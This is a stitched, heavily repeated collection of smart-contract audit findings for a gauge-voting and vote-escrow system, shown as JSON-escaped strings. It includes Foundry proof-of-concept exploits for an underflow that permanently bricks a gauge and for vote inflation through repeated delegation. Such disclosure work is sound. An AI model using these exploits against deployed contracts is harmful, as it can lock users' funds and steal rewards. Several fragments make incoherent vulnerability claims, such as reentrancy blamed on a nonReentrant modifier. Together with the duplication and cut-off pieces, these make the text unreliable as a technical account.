incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

The `_change_gauge_weight` function is called by an attacker with a malicious `_gauge` address and `_weight`.\n2.

This new bias value is calculated based on the current weight of the gauge and the new weight that was passed as an argument to the `_change_gauge_weight` function.\n6.

Specifically, it updates the `bias` field of the `points_weight` mapping, which stores the user's vote status in each checkpoint. However, the function does not update the `time_weight` field correctly, leading to an incorrect index being used when accessing the previous checkpoint vote status. This can cause the new checkpoint to always have a \"false\" vote status, resulting in users losing their eligibility to receive rewards.\n\nTo mitigate this vulnerability, it is recommended that the function `_change_gauge_weight` be modified to correctly update the `time_weight` field when updating the user's vote status in each checkpoint. This can be done by replacing the incorrect index with the correct index for accessing the previous checkpoint vote status.\n\nIn summary, I believe that the given smart contract code is vulnerable to the \"Incorrectly updating user vote status in checkpoints\" vulnerability due to the incorrect index being used when accessing the previous checkpoint vote status.",

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Additional checks can also be implemented to ensure the input bytes array meets specific length requirements, further limiting the potential for malicious manipulation. By addressing these issues, the access control mechanisms within the proxy contract can correctly enforce the required permissions and prevent unauthorized access to sensitive functions.",

Re-entrancy Attack Vulnerability: The `delegate` function in the smart contract has a potential re-entrancy attack vulnerability due to the use of the `nonReentrant` modifier on the function, which is not properly implemented. This modifier is only applied to the internal `_delegate` function and does not protect the entire function from being called multiple times. An attacker could exploit this by calling the `delegate` function with a self-destructed contract address, causing the function to be called repeatedly and potentially leading to a denial of service (DoS) attack.\n2. Authorization Vulnerability: The smart contract has an authorization vulnerability in the `delegate` function due to the use of an improper allowance check mechanism. Specifically, the function updates the `locked[msg.sender]` struct with the new delegatee address even if the user is not allowed to delegate their tokens. This allows an attacker to gain control over the locked tokens of another user by calling the `delegate` function with a malicious address.\n3. Time-Based Attack Vulnerability: The smart contract has a time-based attack vulnerability in the `delegate` function due to the use of a hardcoded lock expiration time of 20 seconds. This allows an attacker to exploit the contract by calling the `delegate` function with a self-destructed contract address and waiting for the lock to expire, effectively gaining control over the locked tokens of another user.\n\nTherefore, based on this given vulnerability knowledge, I would say that the smart contract code is vulnerable to re-entrancy attack, authorization vulnerability, and time-based attack vulnerabilities.",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

